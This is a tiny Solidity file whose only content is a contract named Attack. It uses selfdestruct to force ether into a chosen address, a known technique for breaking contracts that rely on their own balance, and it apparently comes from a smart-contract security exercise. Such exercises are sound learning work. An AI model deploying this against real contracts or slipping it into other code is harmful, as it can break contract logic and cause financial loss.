// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Attack {
    function attack(address payable addr) public payable {
        selfdestruct(addr);
    }
}
